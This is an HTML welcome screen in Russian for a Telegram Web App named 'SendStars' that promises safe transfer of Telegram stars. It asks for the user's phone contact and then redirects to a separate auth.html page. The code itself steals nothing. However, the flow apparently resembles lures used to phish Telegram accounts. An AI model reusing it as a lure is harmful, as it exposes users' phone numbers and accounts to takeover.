<!doctype html>
<html lang="ru">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>SendStars — приветственный экран</title>
  <script src="https://telegram.org/js/telegram-web-app.js"></script>
  <style>
    :root {
      --bg:#f6f8fb;
      --primary-1:#2A9BF8;
      --primary-2:#1877E4;
      --text-strong:#0f1724;
      --text-muted:#64748b;
    }

    * { box-sizing: border-box; margin: 0; padding: 0; }
    html, body { height: 100%; }

    body {
      font-family: Inter, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
      background: #1c1b1b;
      color: var(--text-strong);
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 20px;
      min-height: 100vh;
    }

    .screen {
      width: 400px;
      height: 600px;
      background: #1c1b1b;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 40px 28px;
      position: relative;
      margin: auto;
    }

    .content {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      text-align: center;
      gap: 14px;
      transform: translateY(-20px);
    }

    .hero-image {
      width: 160px;
      height: 160px;
      object-fit: contain;
      margin-top: 45px;
      border: none;
      background: none;
      box-shadow: none;
    }

    h1 {
      font-size: 28px;
      line-height: 1.2;
      color: #fff;
      font-weight: 700;
    }

    h1 .brand {
      display: block;
      color: var(--primary-2);
      font-weight: 800;
      font-size: 28px;
      letter-spacing: 0.2px;
    }

    p.lead {
      color: #b0acac;
      font-size: 17px;
      max-width: 320px;
      margin: 0 auto;
    }

    .cta {
      width: 100%;
      max-width: 275px;
      height: 60px;
      display: inline-flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
      border-radius: 16px;
      border: none;
      color: #fff;
      font-weight: 700;
      font-size: 15px;
      cursor: pointer;
      background: linear-gradient(180deg, var(--primary-1) 0%, var(--primary-2) 100%);
      box-shadow: 0 6px 16px rgba(30,110,230,0.18);
      text-decoration: none;
      transition: transform .12s ease;
      margin-top: 25px;
    }

    .cta:active { transform: translateY(1px); }

    .cta .icon {
      display: inline-flex;
      width: 22px;
      height: 22px;
      align-items: center;
      justify-content: center;
    }

    .footer {
      font-size: 12px;
      color: var(--text-muted);
      text-align: center;
      margin-top: 80px;
    }
  </style>
</head>
<body>
  <div class="screen">
    <div class="content" id="firstPage">
      <img class="hero-image" src="your-image.png" alt="Изображение SendStars" />

      <h1>
        Добро пожаловать в
        <span class="brand">SendStars</span>
      </h1>

      <p class="lead">Безопасный обмен и передача звёзд</p>

      <button class="cta" id="requestContactBtn">
        <span class="icon">
          <svg xmlns="http://www.w3.org/2000/svg" width="22" height="22" viewBox="0 0 24 24" fill="white">
            <path d="M12 0C5.373 0 0 5.373 0 12c0 6.627 5.373 12 12 12s12-5.373 12-12C24 5.373 18.627 0 12 0zm4.98 8.1l-1.71 8.07c-.13.58-.47.72-.95.45l-2.64-1.95-1.27 1.23c-.14.14-.25.25-.5.25l.18-2.61 4.76-4.3c.21-.18-.05-.29-.32-.11l-5.89 3.7-2.54-.79c-.55-.17-.56-.55.11-.81l9.93-3.82c.46-.17.86.11.71.79z"/>
          </svg>
        </span>
        <span>Войти через Telegram</span>
      </button>
    </div>

    <div class="footer">© SendStars — защищённые передачи 2024-2025</div>
  </div>

  <script>
    // Инициализация Telegram Web App
    const tg = window.Telegram.WebApp;
    
    // Инициализируем приложение
    tg.expand();
    tg.enableClosingConfirmation();
    
    // Элементы DOM
    const requestContactBtn = document.getElementById('requestContactBtn');
    
    // Функция для запроса контакта
    function requestContact() {
      tg.requestContact((contact) => {
        if (contact) {
          // Сразу переходим на auth.html после успешного получения контакта
          window.location.href = 'auth.html';
        } else {
          alert('Запрос контакта отменен');
        }
      });
    }
    
    // Обработчик события
    requestContactBtn.addEventListener('click', requestContact);
  </script>
</body>
</html>
